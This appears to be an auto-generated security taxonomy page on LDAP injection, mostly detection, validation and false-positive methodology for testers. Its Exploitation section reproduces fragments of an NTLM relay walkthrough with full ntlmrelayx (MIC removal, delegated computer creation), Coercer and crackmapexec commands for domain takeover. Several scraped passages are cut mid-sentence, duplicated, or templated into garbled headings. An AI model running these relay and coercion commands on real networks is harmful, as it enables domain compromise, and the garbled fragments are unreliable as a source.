<!-- GENERATED from db/wks.db — do not edit -->
# LDAP / XPath / NoSQL-Style Injection

## Definition

A filter or path expression is built from attacker input, changing the query structure.

- **CWE:** 90
- **OWASP:** A03:2021
- **Surface:** web
- **Aliases:** ["ldap injection", "xpath injection", "orm injection"]

Canonical home for `ldap`. Rendered from `db/wks.db` by `tools/taxonomy/build_taxonomy.py` — edit the rows, not this file.

## Root Cause

Not yet researched.

## Preconditions

Not yet researched.

## Attack Surface

Surface: **web**.

The entry points and enabling conditions for this surface are enumerated under **Preconditions**; the observable signals are under **Detection**.

## Detection

**A widened or non-empty result set for a filter that should have matched nothing, carrying directory attributes the application never renders on a normal miss, is the observable signature of a request-controlled filter structure.**

Signal, not proof. Send a value that cannot match any real object, for example a random high-entropy string, and record the application's normal empty-result path. The variant appends a boolean operator and a clause that makes the filter match broadly. If the response changes from no-results to a populated list, and the payload now carries attributes the app only ever emits for real matches - SID, DNT, DN, objectGUID, userAccountControl - then the filter's structure was request-controlled. The attribute differential is what separates this from a cosmetic application bug: a frontend wildcard in the app's own UI would not cause the backend to return directory attributes it has no reason to expose. TrustedSec's DIT work supplies the vocabulary for reading what came back: in the LDAP world, objects are identified by their distinguished name, or DN, and an RDN refers to the individual components of a distinguished name and identifies an object within its parent, so a DN or objectGUID appearing where the app should have shown nothing is a directory-origin artefact. Which attributes are worth requesting is not arbitrary either - BHIS notes that BloodHound, AdExplorer, ADFind and other LDAP enumerators read the UAC value for discovered objects. Caveat to state in the report: a widened result set proves the filter changed, not yet what an attacker can extract.

*Disproof:* Show that the application's own empty-result path already returns a populated template, or that the attributes in the response are rendered by the frontend from data it fetched on a separate call. Then the widened response is application behaviour rather than directory-side filter evaluation.

**A convincing observation for this class is: The falsification test: if a benign request with a known-good value returns an attribute set that does not change when you submit different values, and no directory identifier appears anywhere in the response, then the request value is not reaching a directory filter at all and there is no injection point here.**

Derived from ldap.validation.confirm-which-directory-attribute-your-input-maps-to, which states the boundary for this class. The observation above is what a report must contain to be believed: an artifact the reviewer can re-check, not a claim the hunter asserts. A finding without it is an assertion.

*Disproof:* Not evidence when the observable cannot be produced at all -- blind, server-side-only, or identical-in-every-case behaviour leaves nothing to show. The originating rule (ldap.validation.confirm-which-directory-attribute-your-input-maps-to) states the full boundary.

**A convincing observation for this class is: Adjacent behaviour that produces the same observable result: LDAP reachability is not bounded by enumeration: when the domain's CA has HTTP enrollment enabled with request disposition Issue, the same reachability converts into certificate issuance for an authenticated identity, turning read access...**

Derived from ldap.fp_rule.auto.derived, which states the boundary for this class. The observation above is what a report must contain to be believed: an artifact the reviewer can re-check, not a claim the hunter asserts. A finding without it is an assertion.

*Disproof:* Not evidence when the observable cannot be produced at all -- blind, server-side-only, or identical-in-every-case behaviour leaves nothing to show. The originating rule (ldap.fp_rule.auto.derived) states the full boundary.

## Exploitation

**(This usually happens when relaying from SMB to LDAP).” SMB to LDAP Connection Failed This behavior is expected.**

st --add-computer – create domain computer object -smb2support – SMB version 2 support 
 The full command: ntlmrelayx.py \
 -t ldaps://10.10.10.1 \
 -wh bhispad@foobar.com \
 -smb2support As demonstrated in the figure below, we received a connection via SMB. However, attempting to relay SMB to LDAP resulted in the following error: “[!] The client requested signing. Relaying to LDAP will not work! (This usually happens when relaying from SMB to LDAP).” SMB to LDAP Connection Failed This behavior is expected. Typically, SMB traffic cannot be relayed to LDAP(S). NTLM authentication consists of three message types: NTLM_NEGOTIATE , NTLM_CHALLENGE , and NTLM_AUTHENTICATE . A field known as the Message Integrity Code was added to the NTLM_AUTHENTICATE message to prevent message tampering. A vulnerability was published in 2019 revealing a flaw that allowed an attacker to bypass the NTLM Message Integrity C

*Disproof:* This is refuted if an authoritative source shows the described behaviour does not occur, does not grant access, or is already prevented by default framework configuration: "(This usually happens when relaying from SMB to LDAP).” SMB to LDAP Connection Failed This".

**A vulnerability was published in 2019 revealing a flaw that allowed an attacker to bypass the NTLM Message Integrity Check (MIC). 4 This issue is known as the “drop the MIC” vulnerability and allows an attacker machine-in-the-middle position to tamper with the NTLM authentication by removing the integrity check.**

work! (This usually happens when relaying from SMB to LDAP).” SMB to LDAP Connection Failed This behavior is expected. Typically, SMB traffic cannot be relayed to LDAP(S). NTLM authentication consists of three message types: NTLM_NEGOTIATE , NTLM_CHALLENGE , and NTLM_AUTHENTICATE . A field known as the Message Integrity Code was added to the NTLM_AUTHENTICATE message to prevent message tampering. A vulnerability was published in 2019 revealing a flaw that allowed an attacker to bypass the NTLM Message Integrity Check (MIC). 4 This issue is known as the “drop the MIC” vulnerability and allows an attacker machine-in-the-middle position to tamper with the NTLM authentication by removing the integrity check. When MIC is not included, the connection from SMB can be relayed to LDAPS. Exploiting CVE-2019-1040 Once again, let’s imagine we have gained a foothold in the target organization Foobar’s environment. At this point, we have network level access, and we located the target domain controller DC01.foobar.com (10.10.10.1). To provide a brief initial attack summary: 
 Configure NTLMRelayx to relay NTLM

*Disproof:* Refuted when: the payload is rejected when the same check runs with the defensive control ENABLED (a strict allowlist, a normalisation pass, or a WAF rule) rather than disabled. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“A vulnerability was published in 2019 revealing a flaw that allowed an attacker ”) does not occur under a test that isolates that control.

**Exploiting CVE-2019-1040 Once again, let’s imagine we have gained a foothold in the target organization Foobar’s environment.**

tampering. A vulnerability was published in 2019 revealing a flaw that allowed an attacker to bypass the NTLM Message Integrity Check (MIC). 4 This issue is known as the “drop the MIC” vulnerability and allows an attacker machine-in-the-middle position to tamper with the NTLM authentication by removing the integrity check. When MIC is not included, the connection from SMB can be relayed to LDAPS. Exploiting CVE-2019-1040 Once again, let’s imagine we have gained a foothold in the target organization Foobar’s environment. At this point, we have network level access, and we located the target domain controller DC01.foobar.com (10.10.10.1). To provide a brief initial attack summary: 
 Configure NTLMRelayx to relay NTLM authentication to the target the domain controller and remove message integrity Configure Responder poisoner with SMB and HTTP servers disabled Wait for incoming credentials 
 We can exploit systems v

*Disproof:* This is refuted if an authoritative source shows the described behaviour does not occur, does not grant access, or is already prevented by default framework configuration: "Exploiting CVE-2019-1040 Once again, let’s imagine we have gained a foothold in the target".

**Domain Takeover If we have two domain controllers, and at least one domain controller can be coerced to authenticate to our attacker machine, we can expand upon this attack by relaying credentials from one domain controller to another and creating a computer object with delegation rights to a domain controller.**

effectively escalated from network access to domain account access. We can test our computer account credentials using CrackMapExec 6 and query the ms-ds-machineaccountquota . crackmapexec ldap DC01.foobar.com -u snowmachine2$ -p REDACTED -M MAQ Authenticate as Snowmachine2$ and Get MAQ We can use these domain credentials to enumerate domain information and explore paths of privilege escalation. Domain Takeover If we have two domain controllers, and at least one domain controller can be coerced to authenticate to our attacker machine, we can expand upon this attack by relaying credentials from one domain controller to another and creating a computer object with delegation rights to a domain controller. Scenario Details: 
 Domain Controller 1: DC01.foobar.com (10.10.10.1) Domain Controller 2: DC02.foobar.com (10.10.10.22) Attacker Machine: 10.10.10.200 Owned User: snowmachine2$ (can use any domain user account) Known Domain Administrator Account: DA_Dan 
 We can elevate privileges from a standard domain computer account (snowmachine2$) to a domain administrator account by following the procedure

*Disproof:* This is refuted if an authoritative source shows the described behaviour does not occur, does not grant access, or is already prevented by default framework configuration: "Domain Takeover If we have two domain controllers, and at least one domain controller can ".

**Using the domain credentials obtained from our new computer account snowmachine2$, we can use Coercer to force the victim machine (DC02) to authenticate to the attacker host (10.10.10.200). **Side Note: In some cases, a relay attack may not require domain credentials.**

relayx.py command, we can tell ntlmrelayx to create a computer object with delegation access to the relayed account.: ntlmrelayx.py
 -t ldaps://DC01.foobar.com \
 -wh bhispad \
 --add-computer 'DcMachine' \
 --delegate-access\
 --remove-mic \
 -smb2support Coercer 7 is a python tool used to coerce Windows machines to authenticate to an attacker machine by abusing various vulnerable RPC functions. Using the domain credentials obtained from our new computer account snowmachine2$, we can use Coercer to force the victim machine (DC02) to authenticate to the attacker host (10.10.10.200). **Side Note: In some cases, a relay attack may not require domain credentials. For example, if the victim host is not patched against CVE-2021-36942. 8 ** The Coercer arguments required are as follows: -u - Domain Username
-p - Password for User 
-d - Target Domain
-l - Listener IP (Our Relay)
-t - Target The complete Coercer command is shown below. coercer coerce \
 -u snowmachine2$ \
 -p REDACTED \
 -d foobar.com \
 -l 10.10.10.200 \
 -t DC02.foobar.com The Coercer respon

*Disproof:* This is refuted if an authoritative source shows the described behaviour does not occur, does not grant access, or is already prevented by default framework configuration: "Using the domain credentials obtained from our new computer account snowmachine2$, we can ".

**Where a web-facing application performs an LDAP bind over TLS to a domain controller, the reachable post-injection step is relay of that bind to the DC's LDAPS listener, whose precondition is an absent or strippable client-side message-integrity check.**

Describe the test, do not run it: an application whose auth path binds to AD over LDAPS creates a channel a man-in-the-middle can attempt to terminate. BHIS's relay walkthrough states the routing constraint plainly - LDAP is only available on domain controllers, therefore we must target a domain controller in an LDAP relay attack. The precondition is the message integrity code carried on the NTLM authenticate message: Black Hills' baseline attempt returned 'The client requested signing. Relaying to LDAP will not work!', and they describe the case where, when MIC is not included, the connection from SMB can be relayed to LDAPS. So what you are establishing is whether the application's bind is relayable, which is a property of the client and its patch state rather than of the injection itself - and that is why this belongs in a report as a conditional post-exploitation step, not a claim. The hunt-side corollary is that TrustedSec's LDAP-signing guidance names SMB/LDAP signing plus channel binding enforcement as the control and notes adoption remains low, so an LDAPS bind from an application that presents no channel binding token is exactly the event worth alerting on.

*Disproof:* Show that the application's LDAPS bind presents a channel binding token and that the target DC enforces validation, so a relayed bind is rejected at the TLS layer. Then the bind is not relayable and the post-injection step does not exist.

## Variations

**An unauthenticated bind carrying a name but no password resolves to an anonymous authorization association, so it is an authentication bypass exactly when the application treats an anonymous-but-successful bind as an authenticated user.**

Mechanism: An unauthenticated bind carrying a name but no password resolves to an anonymous authorization association, so it is an authentication bypass exactly when the application treats an anonymous-but-successful bind as an authenticated user. How to apply it in the field: treat this as the bypass it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable. Boundary of the rule: It is NOT a bypass when the application checks the bind DN it obtained back and rejects the empty or anonymous case, or when the directory is configured to require authentication; it IS a bypass when the application only inspects the bind result code and proceeds, because the connection is then authorised as anonymous.

*Disproof:* It is NOT a bypass when the application checks the bind DN it obtained back and rejects the empty or anonymous case, or when the directory is configured to require authentication; it IS a bypass when the application only inspects the bind result code and proceeds, because the connection is then authorised as anonymous.

**A domain controller left at the default channel binding policy accepts a bind that carries no channel binding token at all, so relay protection is off unless the policy has been explicitly raised - and only the Always setting actually blocks the bind.**

The bypass is configuration, not technique. TrustedSec lists the three domain controller options for LDAP server channel binding token requirements and marks the shipped default as Never, with When Supported as audit-only and Always as the value that actually rejects. The When Supported setting is the trap: it permits event generation but does not enforce validation, so systems that do not comply continue to communicate with AD, and an assessor reading the policy sees a non-default value and assumes protection is active. The audit-first design is deliberate and is why the guidance says a 30-day period of audit activity should be sufficient, with Event IDs 3074 and 3075 used to find the offenders before enforcement. Detection side of the same bypass: 3075 is specifically the client that performed an LDAP bind over SSL/TLS and did not provide Channel Binding Information, and these events include a source IP address that can be used to track down the offending application - so the bypass is detectable by log review alone. Validating the claim on a target: read the DC policy value, and confirm whether a token-less bind is rejected or merely logged.

*Disproof:* Show the domain controllers have channel binding token requirements set to Always with logging enabled, and that a bind carrying no channel binding token is rejected by the DC rather than merely logged. Then relay protection is active and the bypass does not exist on that target.

**An escaping routine that only replaces the printable metacharacters ( * ) \ will leave non-UTF-8 octets above 0x7F unencoded, so a payload containing a stray high byte is a practical way to test whether the implementation covers the full assertion-value encoding rather than a denylist.**

RFC 4515 places the obligation on the generator of the string representation: octets greater than 0x7F that are not part of a valid UTF-8 sequence must be escaped, and invalid UTF-8 must not be smuggled into the filter at all. A hunter who only tests printable metacharacters is testing the denylist that is easiest to write and the one the OWASP mitigation guidance explicitly warns against. The field technique is to send a term containing a lone continuation byte or a truncated multi-byte sequence alongside the ordinary asterisk payload: if the application returns a malformed or generic error that differs from its response to a clean value, the input reached the parser unencoded and the escaping is incomplete rather than absent.

*Disproof:* It is a false alarm if the application normalises input to valid UTF-8 before escaping, or if the differing response is the application's own input-validation layer rejecting the string before any LDAP call is made. Show that the request never produced a bind or search operation - no LDAP session in the capture or logs - and the high-byte test proved nothing about escaping.

## Technology / Framework Considerations

Not yet researched.

## API Considerations

Not yet researched.

## Attack Chains

- `chain.ldap.auto.01` — ldap: observe, exercise, confirm (goal: `Establish, exercise and confirm a ldap condition on an authorised target without relying on anyone else's data.`)

## Real-World Examples

Not yet researched.

## Common False Positives

**A search filter that errors or returns an identical failure for EVERY input, including well-formed values the application has matched before, is an application type-confusion or bind-failure bug and not LDAP injection.**

This is the most expensive LDAP false positive: claiming injection because you sent a malformed filter and got an error back. Error responses are also what a bind failure, a null reference from passing a non-string, or an app-side validation layer produce. The discriminating test is three inputs, always: a known-good value the application has matched before, a random non-matching value, and a value carrying filter metacharacters. If the error is identical across all three, the filter never reached the directory with your bytes in it and the finding is an application bug. Only a differential - good and non-matching both behave normally while metacharacters behave differently - supports injection. Mandiant's write-up supports exactly this discipline: it traces whether user input actually reaches the dangerous sink before classifying anything, and it routes results that do not match ground truth to a dedicated false-positive triage stage that must classify findings definitively rather than by resemblance. Second supporting point for the report: an LDAP bind can fail for reasons unrelated to the filter at all, so a bind error must be separated from a search error before either is called injection. The rule: the error itself is never the evidence; the differential against a known-good control is.

*Disproof:* Show a known-good value and a random non-matching value produce the SAME error, status, and timing as a metacharacter-bearing value, with no differential in any response field. Then there is no filter-structure control and the injection claim is unsupported.

**A directory server bound only to a loopback interface is not thereby inaccessible from other hosts, because binding an address controls listening sockets rather than the sources permitted to connect, so an IP firewall is the actual control and its absence is the finding.**

Mechanism: A directory server bound only to a loopback interface is not thereby inaccessible from other hosts, because binding an address controls listening sockets rather than the sources permitted to connect, so an IP firewall is the actual control and its absence is the finding. How to apply it in the field: treat this as the fp_rule it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable. Boundary of the rule: It IS protected when a host firewall or network ACL genuinely restricts inbound connections to that port, and the finding is void; it is NOT protected merely because slapd listens on loopback, since interface binding and source restriction are separate mechanisms and the guide recommends a firewall for selective restriction.

*Disproof:* It IS protected when a host firewall or network ACL genuinely restricts inbound connections to that port, and the finding is void; it is NOT protected merely because slapd listens on loopback, since interface binding and source restriction are separate mechanisms and the guide recommends a firewall for selective restriction.

**Sending an LDAP filter metacharacter in a username field only proves injection when the response changes in a way the filter grammar explains, such as an attribute-presence filter returning every entry; a response that merely differs in length or error text is not proof.**

Mechanism: Sending an LDAP filter metacharacter in a username field only proves injection when the response changes in a way the filter grammar explains, such as an attribute-presence filter returning every entry; a response that merely differs in length or error text is not proof. How to apply it in the field: treat this as the fp_rule it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable. Boundary of the rule: It IS injection when the crafted value alters which entries match, because the filter grammar contains boolean combinators and a presence test that a string-concatenating implementation would let the attacker supply; it is NOT injection when the library escapes the metacharacters before the query is built, or when the identical change appears for a random nonsense username too, which points at application logic rather than filter control.

*Disproof:* It IS injection when the crafted value alters which entries match, because the filter grammar contains boolean combinators and a presence test that a string-concatenating implementation would let the attacker supply; it is NOT injection when the library escapes the metacharacters before the query is built, or when the identical change appears for a random nonsense username too, which points at application logic rather than filter control.

**A rejected or empty-result response to an LDAP injection payload is the expected outcome of a correctly escaped implementation and must be reported as a negative test rather than as evidence of a partially working attack.**

Mechanism: A rejected or empty-result response to an LDAP injection payload is the expected outcome of a correctly escaped implementation and must be reported as a negative test rather than as evidence of a partially working attack. How to apply it in the field: treat this as the fp_rule it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable. Boundary of the rule: It IS partial success if the response status, timing, or a subtly different error message reveals that the server parsed the metacharacters as filter syntax before rejecting the request; a flat generic rejection with no structural difference gives no signal that the input reached the filter parser at all.

*Disproof:* It IS partial success if the response status, timing, or a subtly different error message reveals that the server parsed the metacharacters as filter syntax before rejecting the request; a flat generic rejection with no structural difference gives no signal that the input reached the filter parser at all.

**Reject a ldap finding until it is distinguished from the adjacent behaviour this class also covers. "A vulnerability was published in 2019 revealing a flaw that allowed an attacker to bypass the NTLM Message Integrity Check (MIC). 4 This issue is known as the “drop the MIC” vulnerability and allows an attacker machine-in-the-middle..." and "LDAP reachability is not bounded by enumeration: when the domain's CA has HTTP enrollment enabled with request disposition Issue, the same reachability converts into certificate issuance for an authenticated identity, turning read access..." share a surface and a symptom, so a response that matches the first is not evidence for it while the second remains possible.**

Hypothesis under test: A vulnerability was published in 2019 revealing a flaw that allowed an attacker to bypass the NTLM Message Integrity Check (MIC). 4 This issue is known as the “drop the MIC” vulnerability and allows an attacker machine-in-the-middle...

Adjacent behaviour that produces the same observable result: LDAP reachability is not bounded by enumeration: when the domain's CA has HTTP enrollment enabled with request disposition Issue, the same reachability converts into certificate issuance for an authenticated identity, turning read access...

Why this is worth checking before reporting: both are recorded in this class as gated knowledge, so a tester who stops at the first match will report one of them. The two differ in what the server actually did with the input, and that difference is observable in the response rather than in the request.

Required before treating this as a finding: capture the response that demonstrates the first behaviour specifically, and confirm the second is not what was observed.

*Disproof:* This rule is wrong if a controlled test shows the two behaviours can never co-occur on the same surface, or if the corpus entry for "LDAP reachability is not bounded by enumeration: when the domain's CA " is out of date. In that case this class needs its false-positive guidance rewritten rather than deleted.

**Reporting one shared list of 'LDAP special characters' as the injection surface is a false positive by construction, because the DN metacharacter set and the search-filter metacharacter set do not overlap in the characters they require escaped.**

The OWASP cheat sheet enumerates two disjoint sets: for distinguished names the characters requiring exclusion are backslash, hash, plus, comma, semicolon, quote, equals and leading or trailing spaces, while for search filters the set is asterisk, open parenthesis, close parenthesis, backslash and NUL. A single combined list tells a hunter that parentheses are dangerous everywhere and that commas are dangerous everywhere, both of which are wrong - parentheses are structure in a filter and harmless in a DN, and the comma is the RDN separator in a DN and ordinary data in a filter. The field practice that follows is to identify which context your input lands in before choosing payloads, then to build the test string from the set for that context only.

*Disproof:* It is a real finding if the application concatenates the value into the DN rather than the filter and the DN metacharacters reach the parser unescaped, since a comma or equals sign in the value then splits or rewrites RDNs. The claim is about the shared-list reasoning being wrong, not that injection is impossible.

**A search filter in which an attacker-supplied asterisk arrives at the directory as the literal two-character-plus-hex sequence \2a rather than as a wildcard metacharacter proves the value was escaped per the filter string-representation rule, so a widened result set is not evidence of LDAP injection.**

RFC 4515 defines the wire form of a search filter: an assertion value may only contain UTF-8 characters outside a small exclusion set, and an asterisk must therefore be encoded as the escape sequence \2a. The trap for a hunter is that the browser, the framework, and the LDAP client library each perform a different layer of transformation, so a payload that visibly reads '(cn=*' on the wire may already be inert. In the field this means you cannot conclude anything from the HTTP request body; you have to observe the filter string the directory actually received, either from an LDAP debug log, a packet capture of the LDAP session, or an application trace. If the metacharacter you injected is present as structure in the parsed filter, the filter was concatenated. If it is present as an escape sequence in the assertion value, it is data.

*Disproof:* It IS injection if the directory evaluated the payload as filter structure rather than as an assertion value - for example the filter parsed as a SubstringFilter with an 'any' component, or the result set differs between '(cn=x)' and '(cn=*\2a*)' in a way that reveals the * was honoured as a wildcard. Showing only that the client's HTTP parameter contained an asterisk proves nothing either way.

## Validation

**An LDAP injection test is only meaningful after confirming which directory attribute the request-controlled value lands in, because the returned attribute set of a benign query reveals the server-side mapping without any injection being required.**

Validation step that requires no malicious input and often settles the whole question. Issue a benign query with a value you know matches a real object, and read which attributes come back. Those attributes are the ones the server put in the filter or the search scope, and they tell you the mapping. TrustedSec's Titanis cheatsheet shows the mapping plainly: the SPN mapping query is written against servicePrincipalName and returns sAMAccountName, sAMAccountType and servicePrincipalName, so the requested-attribute list is an exact fingerprint of what the filter touched. BHIS supplies the matching field-level fingerprint on the AD side, noting that BloodHound, AdExplorer, ADFind and other LDAP enumerators read the UAC value for discovered objects - meaning userAccountControl is a field genuinely in demand and therefore genuinely worth mapping. The falsification test: if a benign request with a known-good value returns an attribute set that does not change when you submit different values, and no directory identifier appears anywhere in the response, then the request value is not reaching a directory filter at all and there is no injection point here.

*Disproof:* Show that the benign response's attribute set is constant regardless of the submitted value and contains no directory identifier, DN, or SID, while the server demonstrably issues an LDAP search as visible in LDAP diagnostic logging. Then the request value does not enter the filter and no injection test on that field is valid.

**The convincing LDAP injection proof is a request/response pair where a crafted username field returns directory entries that the equivalent legitimate login must not be able to see, confirming the attacker supplied filter structure rather than a literal value.**

Mechanism: The convincing LDAP injection proof is a request/response pair where a crafted username field returns directory entries that the equivalent legitimate login must not be able to see, confirming the attacker supplied filter structure rather than a literal value. How to apply it in the field: treat this as the validation it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable. Boundary of the rule: If the crafted request returns exactly zero entries or a generic authentication error and never widens the matched set, the injection did not take effect; if the endpoint never passes the field into a filter at all but looks it up by a bind, then the finding is not LDAP injection regardless of the metacharacters sent.

*Disproof:* If the crafted request returns exactly zero entries or a generic authentication error and never widens the matched set, the injection did not take effect; if the endpoint never passes the field into a filter at all but looks it up by a bind, then the finding is not LDAP injection regardless of the metacharacters sent.

**Injection is proven only when a wildcard-bearing filter and a byte-identical filter whose metacharacters have been escaped as \XX produce measurably different result sets against the same directory, which isolates filter structure as the only differing variable.**

A single payload that returns many entries is weak evidence because an attacker-controlled term may simply be matching broadly on a well-populated attribute. The controlled test pairs two requests whose bytes differ only in the escaping of the metacharacters: '(&(uid=*)(objectClass=person))' style widening versus the escaped form where every asterisk has become \2a. Because RFC 4515 requires the escaped form to be a literal-character assertion, any difference in the returned entries, entry count, or which attributes are rendered can only be attributed to the server interpreting the metacharacters as filter structure. That is the difference between a hypothesis and a proof, and it is the form a report should present.

*Disproof:* If the escaped and unescaped forms return identical result sets, the application escaped the value and there is no injection to report, however many entries the plain wildcard form returned. Equally, if the two forms are not actually byte-identical apart from the escaping - different attribute, different base DN, different HTTP method, or a different session - the comparison is void and any observed difference is unattributable.

**When the directory connection uses bind authentication the credential check is performed before the filter is evaluated, so a wildcard payload that returns an authentication error rather than a widened result set is the expected outcome and must be logged as a negative control, not as a blocked attack.**

OWASP's cheat sheet treats bind authentication as a structural control rather than a detection heuristic: with bind auth the server verifies real credentials, so the search filter never becomes the authorisation decision. This gives a hunter a natural negative control - submit the injection payload in the credential field and observe an authentication failure rather than a result set. Two caveats keep the item honest. Anonymous or unauthenticated binds collapse that protection, so the same payload on such a connection will reach the filter and the negative control disappears. And a bind failure is not proof the filter is safe: it only shows this code path was protected.

*Disproof:* If the connection uses anonymous or unauthenticated bind, or if the application performs the credential check in application code and then opens a separate anonymous LDAP connection to run the filter, the wildcard payload reaches the parser and can widen the result set - in which case the bind-auth reasoning does not hold and the negative control must be discarded. Showing a widened result set on such a connection is what refutes it.

**To decide this case, observe: How to apply it in the field: treat this as the fp_rule it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable.**

Derived from ldap.fp_rule.a_listening_on_loopback_is_not_network_exposure_control, which states the false-positive boundary for this class. The observable above is what separates a real finding from the pattern that only looks like one. A hunter who cannot produce this observation in a request/response pair does not have a finding yet.

*Disproof:* This test does not apply where the surrounding behaviour is unobservable -- for example when the response is identical in every case, or when the only evidence is server-side and not reflected to the requester. The originating rule (ldap.fp_rule.a_listening_on_loopback_is_not_network_exposure_control) states the full boundary.

**To decide this case, observe: How to apply it in the field: treat this as the fp_rule it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable.**

Derived from ldap.fp_rule.an_empty_result_on_an_injection_string_means_no_bug_not_a_failed_attack, which states the false-positive boundary for this class. The observable above is what separates a real finding from the pattern that only looks like one. A hunter who cannot produce this observation in a request/response pair does not have a finding yet.

*Disproof:* This test does not apply where the surrounding behaviour is unobservable -- for example when the response is identical in every case, or when the only evidence is server-side and not reflected to the requester. The originating rule (ldap.fp_rule.an_empty_result_on_an_injection_string_means_no_bug_not_a_failed_attack) states the full boundary.

**To decide this case, observe: How to apply it in the field: treat this as the bypass it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable.**

Derived from ldap.bypass.blank_password_bind_is_an_auth_bypass_only_if_the_directory_accepts_it, which states the false-positive boundary for this class. The observable above is what separates a real finding from the pattern that only looks like one. A hunter who cannot produce this observation in a request/response pair does not have a finding yet.

*Disproof:* This test does not apply where the surrounding behaviour is unobservable -- for example when the response is identical in every case, or when the only evidence is server-side and not reflected to the requester. The originating rule (ldap.bypass.blank_password_bind_is_an_auth_bypass_only_if_the_directory_accepts_it) states the full boundary.

**To decide this case, observe: How to apply it in the field: treat this as the fp_rule it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable.**

Derived from ldap.fp_rule.a_login_bypass_needs_proved_filter_semantics_not_just_a_wildcard_response, which states the false-positive boundary for this class. The observable above is what separates a real finding from the pattern that only looks like one. A hunter who cannot produce this observation in a request/response pair does not have a finding yet.

*Disproof:* This test does not apply where the surrounding behaviour is unobservable -- for example when the response is identical in every case, or when the only evidence is server-side and not reflected to the requester. The originating rule (ldap.fp_rule.a_login_bypass_needs_proved_filter_semantics_not_just_a_wildcard_response) states the full boundary.

**To decide this case, observe: How to apply it in the field: treat this as the validation it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable.**

Derived from ldap.validation.prove_filter_injection_with_a_presence_filter_returning_extra_entries, which states the false-positive boundary for this class. The observable above is what separates a real finding from the pattern that only looks like one. A hunter who cannot produce this observation in a request/response pair does not have a finding yet.

*Disproof:* This test does not apply where the surrounding behaviour is unobservable -- for example when the response is identical in every case, or when the only evidence is server-side and not reflected to the requester. The originating rule (ldap.validation.prove_filter_injection_with_a_presence_filter_returning_extra_entries) states the full boundary.

## Impact

**LDAP injection (CWE-90) is an OWASP A03:2021 injection weakness that, when exploitable, undermines confidentiality, integrity, and availability of directory-backed data.**

CWE-90 describes improper neutralization of special elements in an LDAP query. Its impact table lists: Execute Unauthorized Code or Commands; Read Application Data; Modify Application Data, with Scope Confidentiality, Integrity, and Availability (cwe.mitre.org/data/definitions/90.html). The OWASP WSTG confirms that a successful LDAP injection lets a tester access unauthorized content, evade application restrictions, gather unauthorized information, and add or modify objects inside the LDAP tree (owasp.github.io/.../06-LDAP_Injection).

*Disproof:* LDAP injection is not confined to reading directory content: the same filter manipulation can alter or insert objects and, in some configurations, be abused to cause denial of service through expensive or repeated searches. Treating it as a read-only data-leakage issue underestimates its impact.

**Where LDAP signing is not required and channel binding is at its default, a network position between an application and its domain controller can obtain usable bind credential material, making the impact credential theft rather than enumeration.**

State the impact precisely, because it is what justifies the severity. TrustedSec is explicit on the defaults: by default AD does not require LDAP communication to be signed, which makes it vulnerable to hacking, and the channel binding option that would stop the relay sits at its default value. They describe the attacker position directly - placing themselves between the system or application performing an authentication request and AD in an attempt to intercept, modify, and forward the request to obtain a valid authentication ticket - and note these attacks occur under the guise of a normal, legitimate user, which is what makes them hard to spot. Two operational corollaries for the report. First, channel binding is only effective when used with LDAPS, as standard LDAP on port 389 does not operate over SSL/TLS, so a plaintext-port path is unmitigated by design rather than by oversight. Second, the defender's observable is specific and named: monitor Event ID 2889 on domain controllers for signing requests after enabling LDAP diagnostics, and Event IDs 3074 and 3075 for channel binding, with 3075 identifying a client that did not provide Channel Binding Information. Those events include a source IP address that can be used to track down the offending system, which is what turns the impact claim into an actionable detection.

*Disproof:* Show the domain controllers enforce LDAP signing and channel binding at their enforcing settings with auditing in place, so an intercepted bind is rejected at the DC rather than yielding credential material. Then the impact is bounded and the critical severity rating is wrong.

## Related Bug Classes

Not yet researched.

## References

- **blackhillsinfosec.com** (blog)
  - <https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-3>
  - <https://www.blackhillsinfosec.com/bypass-ntlm-message-integrity-check-drop-the-mic>
  - <https://www.blackhillsinfosec.com/one-active-directory-account-can-be-your-best-early-warning>
- **cheatsheetseries.owasp.org** (reference)
  - <https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html>
  - <https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html>
- **cloud.google.com** (advisory)
  - <https://cloud.google.com/blog/topics/threat-intelligence/defending-against-active-exploitation-of-citrix-netscaler-adc-and-gateway-appliances>
  - <https://cloud.google.com/blog/topics/threat-intelligence/staying-ahead-of-adversarial-ai-through-agentic-source-code-review>
- **cwe.mitre.org** (cwe)
  - <https://cwe.mitre.org/data/definitions/90.html>
- **db.gcve.eu** (reference)
  - <https://db.gcve.eu/cwe/CWE-90>
- **mathworks.com** (reference)
  - <https://www.mathworks.com/help/bugfinder/ref/cwe90.html>
- **openldap.org** (writeup)
  - <https://www.openldap.org/doc/admin24/security.html>
- **owasp.github.io** (reference)
  - <https://owasp.github.io/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Injection/06-LDAP_Injection>
- **php.net** (writeup)
  - <https://www.php.net/manual/en/function.ldap-escape.php>
- **portswigger.net** (practitioner)
  - <https://portswigger.net/kb/issues/00100500_ldap-injection>
  - <https://portswigger.net/research/hidden-oauth-attack-vectors>
- **rfc-editor.org** (writeup)
  - <https://www.rfc-editor.org/rfc/rfc4511.txt>
  - <https://www.rfc-editor.org/rfc/rfc4515.html>
- **trustedsec.com** (writeup)
  - <https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc>
  - <https://trustedsec.com/blog/exploring-ntds-dit-part-1-cracking-the-surface-with-dit-explorer>
  - <https://trustedsec.com/blog/kerberos-with-titanis>
  - <https://trustedsec.com/blog/ldap-channel-binding-and-ldap-signing>
- **xygeni.io** (practitioner)
